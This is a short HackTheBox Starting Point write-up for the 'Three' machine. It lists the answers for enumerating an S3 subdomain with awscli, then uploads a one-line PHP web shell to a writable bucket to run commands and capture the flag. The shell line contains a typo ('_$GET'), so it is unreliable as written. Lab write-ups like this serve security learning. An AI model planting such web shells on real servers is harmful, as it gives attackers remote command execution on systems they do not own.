---
title: "Three"
description: A writeup on the machine Three from HackTheBox Starting point Tier1 level 
date: 2024-09-20
draft: false # this section allows the post to be published and be public, is it is set to true the post will not be published.
summary: "Why did the S3 bucket break up with the EC2 instance?  Because it found someone with less latency! 😄" # Here you can write a small summary of the post if needed
tags: [HTB, Very Easy ]
categories: [Tier1, Starting point]
---
# Three

![FZaL4tPWYAEN9lS.jpg](FZaL4tPWYAEN9lS.jpg)

## Task 1

How many TCP ports are open?

![image.png](image.png)

2

## Task 2

What is the domain of the email address provided in the "Contact" section of the website? 

![image.png](image%201.png)

thetoppers.htb 

## Task 3

In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? 

![image.png](image%202.png)

```jsx
/etc/hosts directory
```

## Task 4

Which sub-domain is discovered during further enumeration? 

![image.png](image%203.png)

s3

## Task 5

Which service is running on the discovered sub-domain? 

```jsx
Amazon s3
```

## Task 6

Which command line utility can be used to interact with the service running on the discovered sub-domain? 

![image.png](image%204.png)

awscli

## Task 7

Which command is used to set up the AWS CLI installation? 

```jsx
aws configure
```

## Task 8

What is the command used by the above utility to list all of the S3 buckets? 

![image.png](image%205.png)

```jsx
aws s3 ls
```

## Task 9

This server is configured to run files written in what web scripting language? 

![image.png](image%206.png)

PHP

for obtaining the root flag, we had to write a small php code that would prompt a cmdlet for us to get the flag, however, we had to upload the code to the s3 bucket inorder to be able to access it.

The code we shall use is as follows.

```jsx
<?php system(_$GET['cmd']); ?>
```

![image.png](image%207.png)

we shall then access the shell.php file form the url in order to get our root flag

![image.png](image%208.png)

![image.png](image%209.png)

![image.png](image%2010.png)

and with that, we have pawned the machine.